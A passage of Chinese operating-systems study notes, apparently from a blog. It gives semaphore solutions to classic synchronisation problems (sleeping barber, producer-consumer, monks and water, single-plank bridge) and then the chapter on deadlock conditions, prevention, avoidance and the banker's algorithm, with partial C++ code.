class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> waiting = <span class="hljs-number">0</span>; <span class="hljs-comment">// 等候理发师 顾客坐的椅子数</span><br><span class="hljs-keyword">int</span> CHAIRS = N;  <span class="hljs-comment">// 为顾客准备的椅子数</span><br>semaphore customers = <span class="hljs-number">0</span>; <span class="hljs-comment">// 等候的顾客数</span><br>semaphore barbers = <span class="hljs-number">0</span>;   <span class="hljs-comment">// 空闲的理发师数</span><br>semaphore mutex = <span class="hljs-number">1</span>;     <span class="hljs-comment">// 互斥信号量，保证waiting++操作完整进行</span><br><br><span class="hljs-function">cobegin</span><br><span class="hljs-function">process <span class="hljs-title">barber</span><span class="hljs-params">()</span> </span>&#123;  <span class="hljs-comment">// 理发师</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>        P(customers); <span class="hljs-comment">// 有顾客吗？若无顾客，理发师睡眠</span><br>        P(mutex);     <span class="hljs-comment">// 保证waiting--完整进行</span><br>        <span class="hljs-comment">// 若有顾客时，进入临界区</span><br>        waiting--;    <span class="hljs-comment">// 等候区顾客数减一</span><br>        V(barbers);   <span class="hljs-comment">// 理发师准备为顾客理发</span><br>        V(mutex);<br>        cut_hair();   <span class="hljs-comment">// 理发师正在理发（非临界区）</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function">process <span class="hljs-title">customer_i</span><span class="hljs-params">()</span> </span>&#123;  <span class="hljs-comment">// 顾客</span><br>    P(mutex);     <span class="hljs-comment">// 进入临界区</span><br>    <span class="hljs-keyword">if</span>(waiting &lt; CHAIRS) &#123;  <span class="hljs-comment">// 有空椅子</span><br>        waiting++;    <span class="hljs-comment">// 等候顾客加一</span><br>        V(customers); <span class="hljs-comment">// 唤醒理发师</span><br>        V(mutex);     <span class="hljs-comment">// 退出临界区</span><br>        P(barbers);   <span class="hljs-comment">// 理发师忙，顾客坐下等待</span><br>        get_haircut();<span class="hljs-comment">// 否则顾客坐下理发</span><br>    &#125; <span class="hljs-keyword">else</span><br>        V(mutex);     <span class="hljs-comment">// 没椅子，顾客走人</span><br>&#125;<br>coend<br></code></pre></div></td></tr></table></figure><h3 id="无限缓冲的生产者和消费者"><a class="markdownIt-Anchor" href="#无限缓冲的生产者和消费者"></a> 无限缓冲的生产者和消费者</h3><blockquote><p>假设某生产者—消费者问题的缓冲区是无限的，试用信号量与PV操作给出该问题的解法</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">semaphore mutex;<br>mutex=<span class="hljs-number">1</span>;<span class="hljs-comment">//initial</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consumer</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        P(mutex);<br><span class="hljs-comment">//remove an item from buffer to nextc</span><br>        V(mutex);<br>        <span class="hljs-comment">//consume the item in nextc</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">producer</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br><span class="hljs-comment">//produce an item in nextp</span><br>        P(mutex);<br>        <span class="hljs-comment">//add nextp to buffer</span><br>        V(mutex);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="和尚喝水问题"><a class="markdownIt-Anchor" href="#和尚喝水问题"></a> 和尚喝水问题</h3><blockquote><p>某寺庙，有小和尚、老和尚若干．庙内有一水缸，由小和尚提水入缸，供老和尚饮用。水缸可容纳 30 桶水，每次入水、取水仅为1桶，不可同时进行。水取自同一井中，水井径窄，每次只能容纳一个水桶取水。设水桶个数为5个，试用信号灯和PV操作给出老和尚和小和尚的活动</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">semaphore mutex_well，mutex_tank，empty，full,bucket<br>mutex_well=<span class="hljs-number">1</span>;<span class="hljs-comment">//小和尚从水井提水进程互斥</span><br>mutex_tank=<span class="hljs-number">1</span>;<span class="hljs-comment">//水缸里小和尚入水、老和尚喝水进程互斥</span><br>empty=<span class="hljs-number">30</span>;<span class="hljs-comment">//表示水缸剩余容量</span><br>full=<span class="hljs-number">0</span>;<span class="hljs-comment">//表示水缸是否满</span><br>bucket=<span class="hljs-number">5</span>;<span class="hljs-comment">//水桶数量</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">young_monk</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-built_in">P</span>(empty);<span class="hljs-comment">//水缸容量是否为0，为0则等待</span><br>        <span class="hljs-built_in">P</span>(bucket);<span class="hljs-comment">//是否有水桶，没有则等待</span><br>        <span class="hljs-built_in">P</span>(mutex_well);<span class="hljs-comment">//保证取水进程互斥</span><br>        <span class="hljs-comment">//从水井取水；</span><br>        <span class="hljs-built_in">V</span>(mutex_well);<span class="hljs-comment">//释放</span><br>        <span class="hljs-built_in">P</span>(mutex_tank);<span class="hljs-comment">//保证入水进程互斥</span><br>        <span class="hljs-comment">//向水缸入水；</span><br>        <span class="hljs-built_in">V</span>(mutex_tank);<span class="hljs-comment">//释放</span><br>        <span class="hljs-built_in">V</span>(bucket);<span class="hljs-comment">//回复一个水桶的状态</span><br>        <span class="hljs-built_in">V</span>(full);<span class="hljs-comment">//缸内容量加一</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">old_monk</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">P</span>(full);<span class="hljs-comment">//缸内是否有水</span><br>    <span class="hljs-built_in">P</span>(bucket);<span class="hljs-comment">//是否有水桶</span><br>    <span class="hljs-built_in">P</span>(mutex_tank);<span class="hljs-comment">//保证喝水进程互斥</span><br>    <span class="hljs-comment">//从水缸喝水；</span><br>    <span class="hljs-built_in">V</span>(mutex_tank);<span class="hljs-comment">//释放</span><br>    <span class="hljs-built_in">V</span>(bucket);<span class="hljs-comment">//回复一个水桶的状态</span><br>    <span class="hljs-built_in">V</span>(empty);<span class="hljs-comment">//缸内容量减一</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="过独木桥问题"><a class="markdownIt-Anchor" href="#过独木桥问题"></a> 过独木桥”问题</h3><blockquote><p>请用信号量解决以下的“过独木桥”问题：同一方向的行人可连续过桥，当某一方向有人过桥时，另一方向的行人必须等待；当某一方向无人过桥时，另一方向的行人可以过桥</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">semaphore leftCount=<span class="hljs-number">0</span>,rightCount=<span class="hljs-number">0</span>;<span class="hljs-comment">//左右过桥人数</span><br>semaphore keySignal = <span class="hljs-number">1</span>;<span class="hljs-comment">//实现左右两边公平过桥</span><br>semaphore bridge = <span class="hljs-number">1</span>;<span class="hljs-comment">//实现左右两边过桥互斥</span><br>semaphore leftCountSignal = <span class="hljs-number">1</span>,rightCountSignal=<span class="hljs-number">1</span>;<span class="hljs-comment">//过桥人数计数器资源</span><br><br>reader()<br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;      <br>      wait(leftCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      <span class="hljs-keyword">if</span>(!leftCount)wait(bridge);<span class="hljs-comment">//为零则申请过桥资源</span><br>      leftCount++;<br>      signal(leftCountSignal); <span class="hljs-comment">//释放计数器资源</span><br>         <br>      ...<br>      过桥<br>      ...<br>  <br>      wait(leftCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      leftCount--;<br>      <span class="hljs-keyword">if</span>(!leftCount)signal(bridge);<span class="hljs-comment">//为零则释放过桥资源</span><br>      signal(leftCountSignal); <span class="hljs-comment">//释放读者计数器资源</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">right_people</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;      <br>      wait(rightCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      <span class="hljs-keyword">if</span>(!rightCount)wait(bridge);<span class="hljs-comment">//为零则申请过桥资源</span><br>      rightCount++;<br>      signal(rightCountSignal); <span class="hljs-comment">//释放计数器资源</span><br>         <br>      ...<br>      过桥<br>      ...<br>  <br>      wait(rightCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      rightCount--;<br>      <span class="hljs-keyword">if</span>(!rightCount)signal(bridge);<span class="hljs-comment">//为零则释放过桥资源</span><br>      signal(rightCountSignal); <span class="hljs-comment">//释放读者计数器资源</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="第7章-死锁"><a class="markdownIt-Anchor" href="#第7章-死锁"></a> 第7章 死锁</h1><h2 id="71-系统模型"><a class="markdownIt-Anchor" href="#71-系统模型"></a> 7.1 系统模型</h2><p>当一组进程中的每个进程都在等待一个事件， 而这一事件只能由这一组进程的另 一进程引起， 那么这组进程就处于死锁状态。</p><h2 id="72-死锁特征"><a class="markdownIt-Anchor" href="#72-死锁特征"></a> 7.2 死锁特征</h2><h3 id="721-必要条件"><a class="markdownIt-Anchor" href="#721-必要条件"></a> 7.2.1 必要条件</h3><p>如果在一个系统中下面4个条件同时满足，那么会引起<strong>死锁</strong>。</p><ol><li><strong>互斥：</strong> 至少有一个资源必须处于非共享模式，即一次只有一个进程使用。 如果另一进程申请该资源，那么申请进程必须等到该资源被释放为止。</li><li><strong>占有并等待：</strong> 一个进程必须占有至少一个资源，并等待另一资源， 而该资源为其他进程所占有。</li><li><strong>非抢占：</strong> 资源不能被抢占，即资源只能在进程完成任务后自动释放。</li><li><strong>循环等待：</strong> 有一组等待进程｛P0，P1， …，Pn}， P0等待的资源为P1所占有， P1等待的资源为P2所占有， ……，Pn-1等待的资源为Pn 所占有， Pn 等待的资源为P0所占有。</li></ol><p>在此， 强调所有4个条件必须同时满足才会出现死锁。</p><h3 id="722-资源分配图"><a class="markdownIt-Anchor" href="#722-资源分配图"></a> 7.2.2 资源分配图</h3><p><img src="/posts/8ce3e425/image-20220110122604071.png" alt="image-20220110122604071"></p><p>根据资源分配图的定义，可以证明：如果分配图没有环，那么系统就没有进程死锁。如果分配图有环，那么可能存在死锁。</p><p><img src="/posts/8ce3e425/image-20220110122939209.png" alt="image-20220110122939209"></p><h2 id="73-死锁处理方法"><a class="markdownIt-Anchor" href="#73-死锁处理方法"></a> 7.3 死锁处理方法</h2><p>从原理上来说， 有三种方法可处理死锁问题：</p><ul><li>可使用协议以预防或避免死锁，确保系统不会进入死锁状态。</li><li>可允许系统进入死锁状态，然后检测它，并加以恢复。</li><li>可忽视这个问题，认为死锁不可能在系统内发生。</li></ul><h2 id="74-死锁预防"><a class="markdownIt-Anchor" href="#74-死锁预防"></a> 7.4 死锁预防</h2><p>出现死锁有4个必要条件。 只要确保至少一个必要条件不成立，就能预防死锁发生。</p><h3 id="741-互斥"><a class="markdownIt-Anchor" href="#741-互斥"></a> 7.4.1 互斥</h3><p>对于<strong>非共享资源</strong>，必须要有互斥条件。</p><p>另一方面，<strong>共享资源</strong>不要求互斥访问，因此不会涉及死锁。</p><p>通常不能通过否定互斥条件来预防死锁：有的资源身就是非共享的。</p><h3 id="742-占有并等待"><a class="markdownIt-Anchor" href="#742-占有并等待"></a> 7.4.2 占有并等待</h3><p>为了确保占有并等待条件不会在系统内出现，必须保证：当 一个进程申请一个资源时，它不能占有其他资源。</p><ul><li><p>一种可以使用的协议是<strong>每个进程在执行前申请并获得所有资源</strong>。 可以实现通过要求申请资源的系统调用在所有其他系统调用之前进行。</p></li><li><p>另外一种协议允许<strong>进程在没有资源时才可申请资源</strong>。 一个进程可申请一些资源并使用它们。 然而， 在它申请更多其他资源之前， 它必须释放其现己分配的所有资源。</p></li></ul><p>这两种协议有两个主要缺点。</p><ul><li>第一， 资源利用率可能比较低，因为许多资源可能己分配， 但是很长时间没有被使用。</li><li>第二， 可能发生饥饿。 一个进程如需要多个常用资源， 可能会永久等待， 因为其所需要的资源中至少有一个己分配给其他进程。</li></ul><h3 id="743-非抢占"><a class="markdownIt-Anchor" href="#743-非抢占"></a> 7.4.3 非抢占</h3><p>第三个必要条件是对己分配的资源不能抢占。 为了确保这一条件不成立， 可以使用如下协议：如果一个进程占有资源并申请另一个不能立即分配的资源， 那么其现己分配的资源都可被抢占。 换句话说， 这些资源都被隐式地释放了。</p><p>这个协议通常应用于状态可以保存和恢复的资源，如CPU寄存器和内存。它一般不适用于其他资源， 如打印机和磁带驱动器。</p><h3 id="744-循环等待"><a class="markdownIt-Anchor" href="#744-循环等待"></a> 7.4.4 循环等待</h3><p>死锁的第4个也是最后一个条件是循环等待。</p><p>一个确保此条件不成立的方法是对所有资源类型进行完全排序，且要求每个进程按递增顺序来申请资源</p><h2 id="75-死锁避免"><a class="markdownIt-Anchor" href="#75-死锁避免"></a> 7.5 死锁避免</h2><p>死锁预防算法中，通过限制资源申请的方法来预防死锁。这种限制确保4个必要条件之一不会发生，因此死锁不成立。 然而，通过这种方法预防死锁的副作用是低设备使用率和系统吞吐率。</p><p><strong>死锁避免算法</strong>动态地检测资源分配状态以确保循环等待条件不可能成立。资源分配状态是由可用资源和己分配资源，及进程最大需求所决定的。</p><h3 id="751-安全状态"><a class="markdownIt-Anchor" href="#751-安全状态"></a> 7.5.1 安全状态</h3><p>如果系统能按某个顺序为每个进程分配资源（ 不超过其最大值）并能避免死锁， 那么系统状态就是安全的。 更为准确地说， 如果存在一个<strong>安全序列</strong>， 那么系统处于<strong>安全状态</strong>。</p><blockquote><p>安全序列：</p><p>进程顺序＜P1，P2，…，Pn＞，如果对于每个 Pi, Pi仍然可以申请的资源数小于当前可用资源加上所有进程Pj（其中j&lt;i） 所占有的资源， 那么这一顺序称为安全序列。</p></blockquote><p>在这种情况下，进程Pi所需要的资源即使不能立即可用，Pi也可等待直到所有Pj释放其资源。 当它们完成时，Pi可得到其所需要的所有资源， 完成其给定任务，返回其所分配的资源井终止。</p><p><img src="/posts/8ce3e425/image-20220110131605918.png" alt="image-20220110131605918"></p><h3 id="752-资源分配图算法"><a class="markdownIt-Anchor" href="#752-资源分配图算法"></a> 7.5.2 资源分配图算法</h3><p>假设进程Pi申请资源Rj。只有在将申请边Pi→Rj 变成分配边Rj→Pi 而不会导致资源分配图形成环时，才允许申请。注意，通过采用环检测算法，检测安全性。检测图中是否有环的算法需要n<sup>2</sup>级的操作，其中n是系统的进程数量。</p><p>如果没有环存在， 那么资源分配会使得系统处于安全状态。如果有环存在， 那么分配会导致系统处于不安全状态。因此，进程Pi必须等待其资源申请被满足。</p><p><img src="/posts/8ce3e425/image-20220110132333116.png" alt="image-20220110132333116"></p><h3 id="753-银行家算法"><a class="markdownIt-Anchor" href="#753-银行家算法"></a> 7.5.3 银行家算法</h3><h4 id="1算法原理"><a class="markdownIt-Anchor" href="#1算法原理"></a> 1）算法原理</h4><p><img src="/posts/8ce3e425/image-20220110134858471.png" alt="image-20220110134858471"></p><ol><li><p>安全性算法</p><p><img src="/posts/8ce3e425/image-20220110134809173.png" alt="image-20220110134809173"></p></li><li><p>资源请求算法</p><p><img src="/posts/8ce3e425/image-20220110134844887.png" alt="image-20220110134844887"></p></li></ol><h4 id="2编程实现"><a class="markdownIt-Anchor" href="#2编程实现"></a> 2）编程实现</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> N 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> M 100</span><br><span class="hljs-keyword">int</span> Available[M],     <span class="hljs-comment">//每种资源现有的实例数量</span><br>    Max[N][M],        <span class="hljs-comment">//每个进程i的对资源j最大需求</span><br>    Allocation[N][M], <span class="hljs-comment">//每个进程现在所分配的每个资源的实例数量</span><br>    Need[N][M],       <span class="hljs-comment">//每个进程还需要的剩余的资源</span><br>    Request[N][M],    <span class="hljs-comment">//进程资源请求</span><br>    sign[N],          <span class="hljs-comment">//记录安全序列</span><br>    process_num,      <span class="hljs-comment">//进程数量</span><br>    recourse_num;     <span class="hljs-comment">//资源数量</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//初始化进程资源状况</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; process_num &gt;&gt; recourse_num;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Max[i][j];<br>            Need[i][j] = Max[i][j] - Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        cin &gt;&gt; Available[j];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印进程资源表</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;-----------------------------------进程资源表------------------------------------&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|    进程名称   |   已占用资源  |    尚需资源   |  最大所需资源 |  资源剩余实例 |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> * recourse_num; j++)<br>    &#123;<br><br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">char</span></span>(j % recourse_num + <span class="hljs-string">&#x27;A&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ((j + <span class="hljs-number">1</span>) % recourse_num == <span class="hljs-number">0</span>)<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>; <span class="hljs-comment">//进程名称</span><br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Allocation[i][j]; <span class="hljs-comment">//已占用资源</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Need[i][j]; <span class="hljs-comment">//尚需资源</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Max[i][j]; <span class="hljs-comment">//最大所需资源</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            &#123;<br>                cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Available[j]; <span class="hljs-comment">//资源剩余实例</span><br>            &#125;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; endl;<br>            k = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------------------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">security_test</span><span class="hljs-params">()</span> <span class="hljs-comment">//安全性检查</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> work[recourse_num];<br>    <span class="hljs-keyword">bool</span> finish[process_num];<br>    <span class="hljs-keyword">int</span> count, k = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; recourse_num; i++) <span class="hljs-comment">//初始化work</span><br>    &#123;<br>        work[i] = Available[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span 